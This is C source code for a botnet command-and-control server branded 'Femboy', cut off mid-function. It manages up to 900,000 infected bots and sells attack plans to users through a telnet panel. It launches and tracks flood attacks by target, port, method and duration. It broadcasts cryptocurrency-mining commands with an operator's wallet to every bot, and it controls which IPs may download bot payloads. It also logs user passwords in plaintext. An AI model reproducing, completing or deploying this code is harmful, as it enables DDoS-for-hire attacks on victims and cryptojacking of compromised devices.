#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <signal.h>
#include <netinet/tcp.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <dirent.h>
#include <sys/types.h>
#include <ctype.h>
#include <fcntl.h>

#define MAX_BOTS 900000
#define DUPLICATE_BOT_DETECTION 1
#define MAX_CONNECTIONS 10000
#define BUFFER_SIZE 1024
#define PORT 6676
#define BOT_PORT 6678
#define DOWNLOAD_PORT 6677
#define GIF_PORT 8080
#define API_PORT 6679

#define IAC 255
#define WILL 251
#define WONT 252
#define DO 253
#define DONT 254
#define ECHO_OPT 1
#define LINEMODE 34
#define SUPPRESS_GO_AHEAD 3
#define TERMINAL_TYPE 24


void add_to_blacklist(const char* ip);
int is_ip_blacklisted(const char* ip);
int is_ip_whitelisted(const char* ip);
int check_blacklist_x86_downloads(const char* ip, const char* download_path) {
    if (!download_path) {
        return 1;
    }

    printf("DEBUG: Checking IP %s for path: %s\n", ip, download_path);

    if (is_ip_whitelisted(ip)) {
        printf("DEBUG: IP %s is whitelisted - ALLOWING all downloads\n", ip);
        return 1;
    }

    if (is_ip_blacklisted(ip)) {
        printf("DEBUG: IP %s is already blacklisted - BLOCKING\n", ip);
        return 0;
    }

    char path_lower[256];
    strncpy(path_lower, download_path, sizeof(path_lower) - 1);
    path_lower[sizeof(path_lower) - 1] = '\0';
    
    for (int i = 0; path_lower[i]; i++) {
        path_lower[i] = tolower(path_lower[i]);
    }

    printf("DEBUG: Lowercase path: %s\n", path_lower);

    if (strstr(path_lower, ".sh") != NULL) {
        printf("DEBUG: Script file detected - ALLOWING\n");
        return 1;
    }

    if (strstr(path_lower, "x86_64") != NULL ||
        strstr(path_lower, "x86_32") != NULL ||
        strstr(path_lower, "telnet") != NULL) {
        
        printf("DEBUG: x86 detected for IP %s - BLACKLISTING and BLOCKING\n", ip);
        add_to_blacklist(ip);
        return 0;
    }

    printf("DEBUG: IP %s allowed for path: %s\n", ip, download_path);
    return 1;
}

typedef struct {
    char username[32];
    char password[32];
    char expiry[20];
    int cooldown;
    int vip;
    int max_sessions;
    int max_attacks;
    int admin;
} User;

typedef struct {
    char wallet[128];
    int active;
    int thread_count;
    pid_t pid;
    time_t start_time;
    float hash_rate;
} MiningSession;

typedef struct {
    char username[32];
    char password[32];
    char target[64];
    char port[32];
    char time_val[32];
    char method[32];
} ApiRequest;

typedef struct {
    int socket;
    char ip[16];
    char username[32];
    char architecture[32];  
    char platform[32];    
    char device_type[32];   
    int is_bot;
    int authenticated;
    int active;
    int vip;
    int admin;
    int max_attacks;
    int current_attacks;
    time_t last_attack;
    User* user_info;
} ClientSession;

typedef struct {
    char method[32];
    char ip[64];
    char port[32];
    char duration[32];
    int packet_size;
    int bot_count;
    time_t start_time;
    int duration_seconds;
    ClientSession* owner;
    int active;
} AttackInfo;

ClientSession* connected_bots[MAX_BOTS];
AttackInfo ongoing_attacks[100];
int ongoing_count = 0;
User users[100];
int user_count = 0;
int bot_count = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
int active_connections = 0;
int online_users = 0;
pthread_mutex_t online_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t conn_mutex = PTHREAD_MUTEX_INITIALIZER;
MiningSession mining_sessions[100];
int mining_count = 0;
pthread_mutex_t mining_mutex = PTHREAD_MUTEX_INITIALIZER;
char* current_mining_wallet = NULL;
int current_mining_threads = 0;
int mining_enabled = 0;

int is_ip_blacklisted(const char* ip);
void* handle_bot_connection(void* param);
void* handle_user_connection(void* param);
void* handle_bot_port_connection(void* param);
void* handle_connection(void* param);
void* gif_server(void* param);
void* bot_cleanup_daemon(void* param);
void* handle_download_client(void* param);
void* handle_mining_operation(void* param);
void start_mining_bots(const char* wallet, int threads);
void stop_mining_bots();
void list_mining_wallets(int client_sock);
void add_mining_wallet(int client_sock, const char* wallet);
void remove_mining_wallet(int client_sock, int wallet_id);

void* handle_mining_operation(void* param) {
    char* command = (char*)param;
    char* wallet = strtok(command + 5, " ");
    
    if (wallet && strlen(wallet) > 0) {
        start_mining_bots(wallet, 1);
    }
    
    free(command);
    return NULL;
}

void ignore_sigpipe() {
    signal(SIGPIPE, SIG_IGN);
}

void start_mining_bots(const char* wallet, int threads) {
    pthread_mutex_lock(&bot_mutex);
    
    current_mining_wallet = strdup(wallet);
    current_mining_threads = threads;
    mining_enabled = 1;
    
    char random_suffix[8];
    for (int i = 0; i < 7; i++) {
        random_suffix[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[rand() % 36];
    }
    random_suffix[7] = '\0';
    
    char mining_command[512];
    snprintf(mining_command, sizeof(mining_command), 
             "mine start %s %d %s\r\n", wallet, threads, random_suffix);
    
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            send(connected_bots[i]->socket, mining_command, strlen(mining_command), MSG_NOSIGNAL);
        }
    }
    
    pthread_mutex_lock(&mining_mutex);
    if (mining_count < 100) {
        strncpy(mining_sessions[mining_count].wallet, wallet, sizeof(mining_sessions[mining_count].wallet) - 1);
        mining_sessions[mining_count].active = 1;
        mining_sessions[mining_count].thread_count = threads;
        mining_sessions[mining_count].start_time = time(NULL);
        mining_sessions[mining_count].pid = 0;
        mining_sessions[mining_count].hash_rate = 0.0;
        mining_count++;
    }
    pthread_mutex_unlock(&mining_mutex);
    
    pthread_mutex_unlock(&bot_mutex);
}

void apply_mining_to_new_bot(ClientSession* bot) {
    if (mining_enabled && current_mining_wallet) {
        char random_suffix[8];
        for (int i = 0; i < 7; i++) {
            random_suffix[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[rand() % 36];
        }
        random_suffix[7] = '\0';
        
        char mining_command[512];
        snprintf(mining_command, sizeof(mining_command), 
                 "mine start %s %d %s\r\n", current_mining_wallet, current_mining_threads, random_suffix);
        
        send(bot->socket, mining_command, strlen(mining_command), MSG_NOSIGNAL);
    }
}

void safe_strcpy(char* dest, const char* src, size_t dest_size) {
    if (dest_size > 0) {
        strncpy(dest, src, dest_size - 1);
        dest[dest_size - 1] = '\0';
    }
}

void add_arch_to_blacklist(const char* arch) {
    struct stat st = {0};
    if (stat("blacklist", &st) == -1) {
        mkdir("blacklist", 0700);
    }

    FILE* file = fopen("blacklist/arch.txt", "a");
    if (file) {
        fprintf(file, "%s\n", arch);
        fclose(file);
    }
}

void remove_arch_from_blacklist(const char* arch) {
    FILE* file = fopen("blacklist/arch.txt", "r");
    if (!file) return;
    
    char lines[1000][64];
    int count = 0;
    char line[64];
    
    while (fgets(line, sizeof(line), file) && count < 1000) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && strcmp(line, arch) != 0) {
            strcpy(lines[count++], line);
        }
    }
    fclose(file);
    
    file = fopen("blacklist/arch.txt", "w");
    if (file) {
        for (int i = 0; i < count; i++) {
            fprintf(file, "%s\n", lines[i]);
        }
        fclose(file);
    }
}

int is_arch_blacklisted(const char* arch) {
    FILE* file = fopen("blacklist/arch.txt", "r");
    if (!file) {
        return 0;
    }
    
    char line[64];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        
        if (strlen(line) == 0 || line[0] == '#') {
            continue;
        }
        
        if (strcmp(line, arch) == 0) {
            fclose(file);
            return 1;
        }
    }
    
    fclose(file);
    return 0;
}

void list_arch_blacklist(int client_sock) {
    FILE* file = fopen("blacklist/arch.txt", "r");
    if (!file) {
        send(client_sock, "Architecture blacklist is empty.\r\n", 34, MSG_NOSIGNAL);
        return;
    }
    
    send(client_sock, "Blacklisted Architectures:\r\n", 29, MSG_NOSIGNAL);
    send(client_sock, "--------------------------\r\n", 28, MSG_NOSIGNAL);
    
    char line[64];
    int count = 0;
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && line[0] != '#') {
            char output[128];
            sprintf(output, "%d. %s\r\n", ++count, line);
            send(client_sock, output, strlen(output), MSG_NOSIGNAL);
        }
    }
    
    if (count == 0) {
        send(client_sock, "No blacklisted architectures found.\r\n", 37, MSG_NOSIGNAL);
    }
    
    fclose(file);
}

int safe_send(int sock, const char* data, size_t len) {
    if (sock <= 0 || !data || len == 0) return -1;
    
    ssize_t sent = send(sock, data, len, MSG_NOSIGNAL);
    if (sent <= 0) {
        return -1;
    }
    return sent;
}

int is_ip_blacklisted(const char* ip) {
    FILE* file = fopen("blacklist/bot.txt", "r");
    if (!file) {
        return 0;
    }
    
    char line[64];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        
        if (strlen(line) == 0 || line[0] == '#') {
            continue;
        }
        
        if (strcmp(line, ip) == 0) {
            fclose(file);
            return 1;
        }
    }
    
    fclose(file);
    return 0;
}

void get_server_ip(char* buffer) {
    struct ifaddrs *ifaddr, *ifa;
    if (getifaddrs(&ifaddr) == -1) {
        strcpy(buffer, "0.0.0.0");
        return;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
            char* ip = inet_ntoa(sa->sin_addr);
            if (strcmp(ip, "127.0.0.1") != 0 && strncmp(ip, "10.", 3) != 0 && 
                strncmp(ip, "192.168.", 8) != 0 && strncmp(ip, "172.", 4) != 0) {
                strcpy(buffer, ip);
                break;
            }
        }
    }
    freeifaddrs(ifaddr);
}

void log_login(const char* username, const char* password, const char* status, const char* ip) {
    FILE* file = fopen("logs/logins.json", "a");
    if (file) {
        fprintf(file, "{\"username\": \"%s\", \"password\": \"%s\", \"status\": \"%s\", \"ip\": \"%s\", \"port\": \"%d\"}\n",
                username, password, status, ip, PORT);
        fclose(file);
    }
}

void log_command(const char* username, const char* command, const char* ip) {
    FILE* file = fopen("logs/commands.txt", "a");
    if (file) {
        time_t now = time(NULL);
        struct tm* tm_info = localtime(&now);
        fprintf(file, "%04d/%02d/%02d %02d:%02d:%02d | username: %s | command: %s | ip: %s\n",
                tm_info->tm_year + 1900, tm_info->tm_mon + 1, tm_info->tm_mday,
                tm_info->tm_hour, tm_info->tm_min, tm_info->tm_sec,
                username, command, ip);
        fclose(file);
    }
}

void set_terminal_size(int client_sock, int width, int height) {
    char command[256];
    sprintf(command, "\033[8;%d;%dt", height, width);
    send(client_sock, command, strlen(command), 0);
}

void send_gif_content(int client_sock, const char* filename) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "gifs/%s.tfx", filename);
    
    FILE* file = fopen(filepath, "r");
    if (!file) {
        return;
    }
    
    char line[BUFFER_SIZE];

    while (fgets(line, sizeof(line), file)) {
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') {
            line[len-1] = '\0';
        }
        if (len > 1 && line[len-2] == '\r') {
            line[len-2] = '\0';
        }
        
        const char* pos = line;
        
        while (*pos) {
            const char* sleep_start = strstr(pos, "<<sleep(");
            
            if (sleep_start) {
                size_t segment_len = sleep_start - pos;
                if (segment_len > 0) {
                    send(client_sock, pos, segment_len, MSG_NOSIGNAL);
                }
                
                const char* sleep_end = strstr(sleep_start, ">>");
                if (!sleep_end) break;
                
                char numbuf[16];
                int sleep_len = sleep_end - (sleep_start + 8);
                if (sleep_len > 0 && sleep_len < (int)sizeof(numbuf)) {
                    strncpy(numbuf, sleep_start + 8, sleep_len);
                    numbuf[sleep_len] = '\0';
                    int milliseconds = atoi(numbuf);
                    if (milliseconds > 0) {
                        usleep((useconds_t)milliseconds * 1000);
                    }
                }
                pos = sleep_end + 2;
            } else {
                send(client_sock, pos, strlen(pos), MSG_NOSIGNAL);
                break;
            }
        }
        
        send(client_sock, "\r\n", 2, MSG_NOSIGNAL);
    }
    
    fclose(file);
}

void send_tfx_content(int client_sock, const char* content, const char* username, const char* expiry,
                      int ongoing, int max, int bots, int vip, int max_sessions, int cooldown, int admin) {
    const char* ptr = content;

    while (*ptr) {
        const char* sleep_start = strstr(ptr, "<<sleep(");
        const char* tag_start = strstr(ptr, "{");

        if (sleep_start && (!tag_start || sleep_start < tag_start)) {
            size_t segment_len = sleep_start - ptr;
            if (segment_len > 0)
                send(client_sock, ptr, segment_len, MSG_NOSIGNAL);

            const char* sleep_end = strstr(sleep_start, ">>");
            if (!sleep_end) break;

            char numbuf[16];
            int len = sleep_end - (sleep_start + 8);
            if (len > 0 && len < (int)sizeof(numbuf)) {
                strncpy(numbuf, sleep_start + 8, len);
                numbuf[len] = '\0';
                int milliseconds = atoi(numbuf);
                if (milliseconds > 0) {
                    usleep((useconds_t)milliseconds * 1000);
                }
            }
            ptr = sleep_end + 2;
            continue;
        }

        if (!tag_start) {
            send(client_sock, ptr, strlen(ptr), MSG_NOSIGNAL);
            break;
        }

        size_t segment_len = tag_start - ptr;
        if (segment_len > 0) {
            send(client_sock, ptr, segment_len, MSG_NOSIGNAL);
        }

        const char* tag_end = strstr(tag_start, "}");
        if (!tag_end) break;

        char tag[128];
        size_t tag_len = tag_end - tag_start - 1;
        if (tag_len >= sizeof(tag)) tag_len = sizeof(tag) - 1;
        strncpy(tag, tag_start + 1, tag_len);
        tag[tag_len] = '\0';

        if (strcmp(tag, "USERNAME") == 0 && username) {
            send(client_sock, username, strlen(username), MSG_NOSIGNAL);
        } else if (strcmp(tag, "expiry") == 0 && expiry) {
            send(client_sock, expiry, strlen(expiry), MSG_NOSIGNAL);
        } else if (strcmp(tag, "ongoing") == 0) {
            char buf[16];
            sprintf(buf, "%d", ongoing);
            send(client_sock, buf, strlen(buf), MSG_NOSIGNAL);
        } else if (strcmp(tag, "max") == 0) {
            char buf[16];
            sprintf(buf, "%d", max);
            send(client_sock, buf, strlen(buf), MSG_NOSIGNAL);
        } else if (strcmp(tag, "bots") == 0) {
            char buf[16];
            sprintf(buf, "%d", bots);
            send(client_sock, buf, strlen(buf), MSG_NOSIGNAL);
        } else if (strcmp(tag, "vip") == 0) {
            send(client_sock, vip ? "Yes" : "No", vip ? 3 : 2, MSG_NOSIGNAL);
        } else if (strcmp(tag, "max_sessions") == 0) {
            char buf[16];
            sprintf(buf, "%d", max_sessions);
            send(client_sock, buf, strlen(buf), MSG_NOSIGNAL);
        } else if (strcmp(tag, "cooldown") == 0) {
            char buf[16];
            sprintf(buf, "%d", cooldown);
            send(client_sock, buf, strlen(buf), MSG_NOSIGNAL);
        } else if (strcmp(tag, "admin") == 0) {
            send(client_sock, admin ? "Yes" : "No", admin ? 3 : 2, MSG_NOSIGNAL);
        } else if (strcmp(tag, "RED") == 0) {
            send(client_sock, "\033[31m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "GREEN") == 0) {
            send(client_sock, "\033[32m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "LIGHT_GREEN") == 0) {
            send(client_sock, "\033[92m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "YELLOW") == 0) {
            send(client_sock, "\033[33m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "BLUE") == 0) {
            send(client_sock, "\033[34m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "MAGENTA") == 0) {
            send(client_sock, "\033[35m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "CYAN") == 0) {
            send(client_sock, "\033[36m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "WHITE") == 0) {
            send(client_sock, "\033[97m", 5, MSG_NOSIGNAL);
        } else if (strcmp(tag, "RESET") == 0) {
            send(client_sock, "\033[0m", 4, MSG_NOSIGNAL);
        } else if (strcmp(tag, "BOLD") == 0) {
            send(client_sock, "\033[1m", 4, MSG_NOSIGNAL);
        } else if (strcmp(tag, "UNDERLINE") == 0) {
            send(client_sock, "\033[4m", 4, MSG_NOSIGNAL);
        } else if (strncmp(tag, "size:", 5) == 0) {
            int width, length;
            if (sscanf(tag + 5, "%dx%d", &width, &length) == 2)
                set_terminal_size(client_sock, width, length);
        } else if (strncmp(tag, "GIF-", 4) == 0) {
            send_gif_content(client_sock, tag + 4);
        } else {
            send(client_sock, tag_start, (tag_end - tag_start) + 1, MSG_NOSIGNAL);
        }

        ptr = tag_end + 1;
    }
}

void send_attack_info(int client_sock, const char* ip, const char* port, const char* duration, const char* method, int bots) {
    FILE* file = fopen("branding/attack.tfx", "r");
    if (!file) {
        char default_attack[256];
        snprintf(default_attack, sizeof(default_attack), "[ Attack details ]\r\n  ¦ Status ..... [ Successfully ]\r\n  ¦ Method ..... [ %s ]\r\n  ¦ Target ..... [ %s ]\r\n  ¦ Port ....... [ %s ]\r\n  ¦ Time ....... [ %s ]\r\n  ¦ Bots ....... [ %d ]\r\n", 
                method, ip, port, duration, bots);
        send(client_sock, default_attack, strlen(default_attack), MSG_NOSIGNAL);
        return;
    }
    
    char asn[64] = "Unknown";
    char org[256] = "Unknown";
    char country[64] = "Unknown";
    char timebuf[64] = "Unknown";

    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    if (tm_info) {
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);
    }

    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo("whois.cymru.com", "43", &hints, &res) == 0 && res) {
        int wsock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (wsock >= 0) {
            if (connect(wsock, res->ai_addr, res->ai_addrlen) == 0) {
                char query[128];
                snprintf(query, sizeof(query), " -v %s\r\n", ip);
                send(wsock, query, strlen(query), MSG_NOSIGNAL);

                char whbuf[4096];
                ssize_t rcv; size_t total = 0;
                struct timeval tv;
                tv.tv_sec = 1;
                tv.tv_usec = 0;
                setsockopt(wsock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

                while ((rcv = recv(wsock, whbuf + total, sizeof(whbuf) - total - 1, 0)) > 0) {
                    total += rcv;
                    if (total >= sizeof(whbuf) - 2) break;
                }
                whbuf[total] = '\0';

                char* line_ptr = NULL;
                char* tok = strtok(whbuf, "\n");
                while (tok) {
                    if (strchr(tok, '|')) line_ptr = tok;
                    tok = strtok(NULL, "\n");
                }

                if (line_ptr) {
                    char* parts[8];
                    int p = 0;
                    char* part = strtok(line_ptr, "|");
                    while (part && p < 8) {
                        while (*part == ' ') part++;
                        char* endp = part + strlen(part) - 1;
                        while (endp > part && (*endp == ' ' || *endp == '\r' || *endp == '\n')) { *endp = '\0'; endp--; }
                        parts[p++] = part;
                        part = strtok(NULL, "|");
                    }
                    if (p >= 1) strncpy(asn, parts[0], sizeof(asn)-1);
                    if (p >= 4) strncpy(country, parts[3], sizeof(country)-1);
                    if (p >= 7) strncpy(org, parts[6], sizeof(org)-1);
                }
            }
            close(wsock);
        }
        freeaddrinfo(res);
    }

    char line[BUFFER_SIZE];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = 0;
        
        char output[BUFFER_SIZE] = "";
        char* pos = line;
        size_t output_len = 0;
        
        while (*pos && output_len < sizeof(output) - 1) {
            if (*pos == '{') {
                char* end = strchr(pos, '}');
                if (end) {
                    char tag[64];
                    int tag_len = end - pos - 1;
                    if (tag_len >= sizeof(tag)) tag_len = sizeof(tag) - 1;
                    strncpy(tag, pos + 1, tag_len);
                    tag[tag_len] = '\0';
                    
                    const char* replacement = "";
                    size_t repl_len = 0;
                    
                    if (strcmp(tag, "ip") == 0) {
                        replacement = ip;
                        repl_len = strlen(ip);
                    } else if (strcmp(tag, "port") == 0) {
                        replacement = port;
                        repl_len = strlen(port);
                    } else if (strcmp(tag, "duration") == 0) {
                        replacement = duration;
                        repl_len = strlen(duration);
                    } else if (strcmp(tag, "method") == 0) {
                        replacement = method;
                        repl_len = strlen(method);
                    } else if (strcmp(tag, "asn") == 0) {
                        replacement = asn;
                        repl_len = strlen(asn);
                    } else if (strcmp(tag, "org") == 0) {
                        replacement = org;
                        repl_len = strlen(org);
                    } else if (strcmp(tag, "country") == 0) {
                        replacement = country;
                        repl_len = strlen(country);
                    } else if (strcmp(tag, "time") == 0) {
                        replacement = timebuf;
                        repl_len = strlen(timebuf);
                    } else if (strcmp(tag, "bots") == 0) {
                        char bots_str[10];
                        snprintf(bots_str, sizeof(bots_str), "%d", bots);
                        replacement = bots_str;
                        repl_len = strlen(bots_str);
                    } else if (strcmp(tag, "LIGHT_GREEN") == 0) {
                        replacement = "\033[92m";
                        repl_len = 5;
                    } else if (strcmp(tag, "RED") == 0) {
                        replacement = "\033[31m";
                        repl_len = 5;
                    } else if (strcmp(tag, "CYAN") == 0) {
                        replacement = "\033[36m";
                        repl_len = 5;
                    } else if (strcmp(tag, "ORANGE") == 0) {
                        replacement = "\033[38m";
                        repl_len = 5;
                    } else if (strcmp(tag, "WHITE") == 0) {
                        replacement = "\033[97m";
                        repl_len = 5;
                    } else if (strcmp(tag, "RESET") == 0) {
                        replacement = "\033[0m";
                        repl_len = 4;
                    } else if (strncmp(tag, "width:", 6) == 0) {
                        int width = atoi(tag + 6);
                        if (width > 0) {
                            set_terminal_size(client_sock, width, 24);
                        }
                        pos = end + 1;
                        continue;
                    } else if (strncmp(tag, "length:", 7) == 0) {
                        int length = atoi(tag + 7);
                        if (length > 0) {
                            set_terminal_size(client_sock, 80, length);
                        }
                        pos = end + 1;
                        continue;
                    } else if (strncmp(tag, "size:", 5) == 0) {
                        int width, length;
                        if (sscanf(tag + 5, "%dx%d", &width, &length) == 2) {
                            if (width > 0 && length > 0) {
                                set_terminal_size(client_sock, width, length);
                            }
                        }
                        pos = end + 1;
                        continue;
                    } else {
                        size_t copy_len = end - pos + 1;
                        if (output_len + copy_len < sizeof(output) - 1) {
                            strncat(output, pos, copy_len);
                            output_len += copy_len;
                        }
                        pos = end + 1;
                        continue;
                    }
                    
                    if (output_len + repl_len < sizeof(output) - 1) {
                        strncat(output, replacement, repl_len);
                        output_len += repl_len;
                    }
                    pos = end + 1;
                } else {
                    if (output_len < sizeof(output) - 1) {
                        output[output_len++] = *pos;
                        output[output_len] = '\0';
                    }
                    pos++;
                }
            } else {
                if (output_len < sizeof(output) - 1) {
                    output[output_len++] = *pos;
                    output[output_len] = '\0';
                }
                pos++;
            }
        }
        
        if (strlen(output) > 0) {
            send(client_sock, output, strlen(output), 0);
            send(client_sock, "\r\n", 2, 0);
        }
    }
    fclose(file);
    send(client_sock, "\033[0m", 4, MSG_NOSIGNAL);
}

int is_ip_whitelisted(const char* ip) {
    FILE* file = fopen("whitelist/bot.txt", "r");
    if (!file) {
        return 0;
    }
    
    char line[64];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        
        if (strlen(line) == 0 || line[0] == '#') {
            continue;
        }
        
        if (strcmp(line, ip) == 0) {
            fclose(file);
            return 1;
        }
    }
    
    fclose(file);
    return 0;
}

void add_to_whitelist(const char* ip) {
    if (!ip || strlen(ip) == 0) return;

    printf("DEBUG: Adding IP %s to whitelist\n", ip);

    struct stat st = {0};
    if (stat("whitelist", &st) == -1) {
        mkdir("whitelist", 0700);
    }

    if (is_ip_whitelisted(ip)) {
        printf("DEBUG: IP %s already in whitelist\n", ip);
        return;
    }

    FILE* file = fopen("whitelist/bot.txt", "a");
    if (file) {
        fprintf(file, "%s\n", ip);
        fclose(file);
        printf("DEBUG: Successfully wrote IP %s to whitelist file\n", ip);
    } else {
        printf("DEBUG: FAILED to open whitelist file for writing\n");
    }
}

void remove_from_whitelist(const char* ip) {
    FILE* file = fopen("whitelist/bot.txt", "r");
    if (!file) return;
    
    char lines[1000][64];
    int count = 0;
    char line[64];
    
    while (fgets(line, sizeof(line), file) && count < 1000) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && strcmp(line, ip) != 0) {
            strcpy(lines[count++], line);
        }
    }
    fclose(file);
    
    file = fopen("whitelist/bot.txt", "w");
    if (file) {
        for (int i = 0; i < count; i++) {
            fprintf(file, "%s\n", lines[i]);
        }
        fclose(file);
    }
}

void list_whitelist(int client_sock) {
    FILE* file = fopen("whitelist/bot.txt", "r");
    if (!file) {
        send(client_sock, "Whitelist is empty or doesn't exist.\r\n", 38, MSG_NOSIGNAL);
        return;
    }
    
    send(client_sock, "Whitelisted IPs:\r\n", 18, MSG_NOSIGNAL);
    send(client_sock, "----------------\r\n", 18, MSG_NOSIGNAL);
    
    char line[64];
    int count = 0;
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = '\0';
        if (strlen(line) > 0 && line[0] != '#') {
            char output[128];
            sprintf(output, "%d. %s\r\n", ++count, line);
            send(client_sock, output, strlen(output), MSG_NOSIGNAL);
        }
    }
    
    if (count == 0) {
        send(client_sock, "No whitelisted IPs found.\r\n", 27, MSG_NOSIGNAL);
    }
    
    fclose(file);
}

void send_tfx_file(int client_sock, const char* filename, const char* username, const char* expiry, int ongoing, int max, int bots, int vip, int max_sessions, int cooldown, int admin) {
    FILE* file = fopen(filename, "r");
    if (!file) return;
    char line[BUFFER_SIZE];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = 0;
        if (strstr(line, "Femboy") && strchr(line, '$')) {
            continue;
        }
        send_tfx_content(client_sock, line, username, expiry, ongoing, max, bots, vip, max_sessions, cooldown, admin);
        send(client_sock, "\r\n", 2, MSG_NOSIGNAL);
    }
    fclose(file);
}

void send_prompt(int client_sock, const char* username) {
    FILE* file = fopen("branding/prompt.tfx", "r");
    if (!file) {
        char default_prompt[100];
        sprintf(default_prompt, "\033[91m[%s]\033[0m@\033[96mFemboy\033[0m:\033[92m$ \033[0m", username);
        send(client_sock, default_prompt, strlen(default_prompt), 0);
        return;
    }
    
    char line[BUFFER_SIZE];
    while (fgets(line, sizeof(line), file)) {
        line[strcspn(line, "\r\n")] = 0;
        send_tfx_content(client_sock, line, username, NULL, 0, 0, 0, 0, 0, 0, 0);
    }
    fclose(file);
}

void send_title(int client_sock, ClientSession* session) {
    send_tfx_file(client_sock, "branding/title.tfx", session->username, 
                  session->user_info->expiry, session->current_attacks, 
                  session->max_attacks, bot_count, 0, 0, 0, 0);
}

void send_main(int client_sock, ClientSession* session) {
    send_tfx_file(client_sock, "branding/main.tfx", session->username, NULL, 0, 0, 0, 0, 0, 0, 0);
}

void send_plan(int client_sock, ClientSession* session) {
    send_tfx_file(client_sock, "branding/plan.tfx", session->username,
                  session->user_info->expiry, 0, 0, 0,
                  session->user_info->vip, session->user_info->max_sessions,
                  session->user_info->cooldown, session->user_info->admin);
}

void list_bots(int client_sock) {
    pthread_mutex_lock(&bot_mutex);
    
    char bot_msg[256];
    sprintf(bot_msg, "%-4s %-15s %-10s %-10s %-10s\r\n", "ID", "IP", "ARCH", "PLATFORM", "DEVICE");
    send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
    send(client_sock, "--------------------------------------------------------\r\n", 56, MSG_NOSIGNAL);
    
    int bot_id = 1;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            sprintf(bot_msg, "%-4d %-15s %-10s %-10s %-10s\r\n", 
                    bot_id, 
                    connected_bots[i]->ip, 
                    connected_bots[i]->architecture,
                    connected_bots[i]->platform,
                    connected_bots[i]->device_type);
            send(client_sock, bot_msg, strlen(bot_msg), MSG_NOSIGNAL);
            bot_id++;
        }
    }
    
    pthread_mutex_unlock(&bot_mutex);
}

void list_users(int client_sock) {
    char user_msg[256];
    sprintf(user_msg, "%-4s %-15s\r\n", "ID", "USERNAME");
    send(client_sock, user_msg, strlen(user_msg), MSG_NOSIGNAL);
    send(client_sock, "-------------------\r\n", 21, MSG_NOSIGNAL);
    
    for (int i = 0; i < user_count; i++) {
        sprintf(user_msg, "%-4d %-15s\r\n", i+1, users[i].username);
        send(client_sock, user_msg, strlen(user_msg), MSG_NOSIGNAL);
    }
}

void kick_bot(int client_sock, int bot_id) {
    pthread_mutex_lock(&bot_mutex);
    
    int current_id = 1;
    for (int i = 0; i < MAX_BOTS; i++) {
        if (connected_bots[i] != NULL && connected_bots[i]->is_bot && connected_bots[i]->active) {
            if (current_id == bot_id) {
                char kick_msg[256];
                sprintf(kick_msg, "Kicking bot %d (%s)\r\n", bot_id, connected_bots[i]->ip);
                send(client_sock, kick_msg, strlen(kick_msg), MSG_NOSIGNAL);
                
                close(connected_bots[i]->socket);
                free(connected_bots[i]);
                connected_bots[i] = NULL;
                bot_count--;
                
                pthread_mutex_unlock(&bot_mutex);
                return;
            }
            current_id++;
        }
    }
    
    send(client_sock, "Bot ID not found!\r\n", 19, MSG_NOSIGNAL);
    pthread_mutex_unlock(&bot_mutex);
}

void kick_user(int client_sock, int user_id) {
    if (user_id < 1 || user_id > user_count) {
        send(client_sock, "User ID not found!\r\n", 20, MSG_NOSIGNAL);
        return;
    }
    
    char kick_msg[256];
    sprintf(kick_msg, "Removed user: %s\r\n", users[user_id-1].username);
    send(client_sock, kick_msg, strlen(kick_msg), MSG_NOSIGNAL);
    
    for (int i = user_id-1; i < user_count - 1; i++) {
        users[i] = users[i + 1];
    }
    user_count--;
    
    FILE* file = fopen("user.txt", "w");
    if (file) {
        for (int i = 0; i < user_count; i++) {
            fprintf(file, "%s:%s:%s:%d:%d:%d:%d:%d\n",
                    users[i].username, users[i].password, users[i].expiry,
